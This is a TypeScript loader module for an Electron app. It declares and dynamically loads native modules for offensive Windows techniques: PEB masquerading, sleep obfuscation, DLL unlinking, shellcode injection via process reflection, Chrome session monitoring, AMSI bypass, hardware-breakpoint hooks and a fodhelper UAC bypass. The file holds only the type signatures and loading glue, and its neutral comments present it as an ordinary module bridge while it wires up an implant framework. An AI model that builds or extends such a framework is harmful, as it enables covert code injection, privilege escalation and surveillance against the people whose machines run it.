/**
 * Native Module Bridge
 * 
 * This module provides a bridge to load and use native C++ modules in the application.
 * It dynamically loads native modules and provides error handling for when modules
 * are not available.
 */

import { createRequire } from 'module';
import path from 'path';
import { app } from 'electron';
import fs from 'fs';

// Type definitions for the native modules we'll implement
export interface INativeModules {
  masqueradePeb?: {
    masqueradePebAsExplorer: () => boolean;
  };
  sleepObfuscation?: {
    sleepObfuscationViaVirtualProtect: (sleepTimeInMilliseconds: number, key: Buffer) => boolean;
  };
  removeDllFromPeb?: {
    removeDllFromPebW: (moduleName: string) => boolean;
  };
  processReflection?: {
    mpfProcessInjectionViaProcessReflection: (shellcode: Buffer, targetPid: number) => boolean;
  };
  chromeMonitor?: {
    mpfComMonitorChromeSessionOnce: () => number;
  };
  amsiBypass?: {
    amsiBypassViaPatternScan: () => boolean;
  };
  hardwareBreakpointHook?: {
    snapshotInsertHardwareBreakpointHookIntoTargetThread: (
      address: number, 
      position: number, 
      init: boolean, 
      tid: number
    ) => boolean;
  };
  uacBypass?: {
    uacBypassFodHelperMethodW: (pathToBinaryToExecute: string) => { 
      success: boolean; 
      processInfo?: { 
        processId: number; 
        threadId: number; 
      } 
    };
  };
}

// Keep track of loaded modules
const loadedModules: INativeModules = {};

/**
 * Gets the path to the native module
 */
const getNativeModulePath = (moduleName: string): string => {
  // In development, modules are in src/native
  // In production, they're in resources/app.asar.unpacked/dist/native
  const isDev = process.env.NODE_ENV === 'development';
  
  if (isDev) {
    return path.join(__dirname, '..', 'native', moduleName);
  } else {
    // For production, the native modules should be in an unpacked directory
    return path.join(app.getAppPath() + '.unpacked', 'dist', 'native', moduleName);
  }
};

/**
 * Dynamically loads a native module
 */
export const loadNativeModule = <T>(moduleName: string): T | undefined => {
  try {
    const require = createRequire(import.meta.url);
    const modulePath = getNativeModulePath(moduleName);
    
    // Check if the module exists
    if (!fs.existsSync(modulePath)) {
      console.warn(`Native module not found: ${modulePath}`);
      return undefined;
    }
    
    return require(modulePath);
  } catch (error) {
    console.error(`Failed to load native module: ${moduleName}`, error);
    return undefined;
  }
};

/**
 * Initializes all native modules
 */
export const initializeNativeModules = (): INativeModules => {
  try {
    // Load each module only if it hasn't been loaded yet
    if (!loadedModules.masqueradePeb) {
      const module = loadNativeModule<INativeModules['masqueradePeb']>('masqueradePeb');
      if (module) loadedModules.masqueradePeb = module;
    }
    
    if (!loadedModules.sleepObfuscation) {
      const module = loadNativeModule<INativeModules['sleepObfuscation']>('sleepObfuscation');
      if (module) loadedModules.sleepObfuscation = module;
    }
    
    if (!loadedModules.removeDllFromPeb) {
      const module = loadNativeModule<INativeModules['removeDllFromPeb']>('removeDllFromPeb');
      if (module) loadedModules.removeDllFromPeb = module;
    }
    
    if (!loadedModules.processReflection) {
      const module = loadNativeModule<INativeModules['processReflection']>('processReflection');
      if (module) loadedModules.processReflection = module;
    }
    
    if (!loadedModules.chromeMonitor) {
      const module = loadNativeModule<INativeModules['chromeMonitor']>('chromeMonitor');
      if (module) loadedModules.chromeMonitor = module;
    }
    
    if (!loadedModules.amsiBypass) {
      const module = loadNativeModule<INativeModules['amsiBypass']>('amsiBypass');
      if (module) loadedModules.amsiBypass = module;
    }
    
    if (!loadedModules.hardwareBreakpointHook) {
      const module = loadNativeModule<INativeModules['hardwareBreakpointHook']>('hardwareBreakpointHook');
      if (module) loadedModules.hardwareBreakpointHook = module;
    }
    
    if (!loadedModules.uacBypass) {
      const module = loadNativeModule<INativeModules['uacBypass']>('uacBypass');
      if (module) loadedModules.uacBypass = module;
    }
    
    return loadedModules;
  } catch (error) {
    console.error('Error initializing native modules:', error);
    return loadedModules;
  }
};

/**
 * Gets a specific native module
 */
export const getNativeModule = <K extends keyof INativeModules>(moduleName: K): INativeModules[K] | undefined => {
  if (!loadedModules[moduleName]) {
    const module = loadNativeModule<INativeModules[K]>(moduleName as string);
    if (module) loadedModules[moduleName] = module;
  }
  
  return loadedModules[moduleName];
};

// Export the loaded modules
export default loadedModules; 